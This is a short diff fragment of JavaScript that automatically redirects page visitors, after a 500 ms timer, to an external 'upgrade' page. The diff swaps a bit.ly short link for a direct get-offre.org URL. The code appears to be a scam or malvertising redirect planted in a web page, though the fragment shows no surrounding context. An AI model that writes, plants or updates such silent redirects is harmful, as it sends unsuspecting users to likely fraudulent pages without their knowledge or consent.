@@ -5,8 +5,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://bit.ly/yhauajjdng";
+        location.href="https://get-offre.org/jambupgrade.html#1714610631028";
     }
     function goon(){
-        location.href="https://bit.ly/yhauajjdng";
+        location.href="https://get-offre.org/jambupgrade.html#1714610631028";
     }
